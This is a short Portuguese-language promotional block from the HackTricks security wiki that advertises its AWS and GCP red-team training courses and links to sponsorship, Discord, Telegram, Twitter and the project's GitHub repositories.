{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-nos no** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
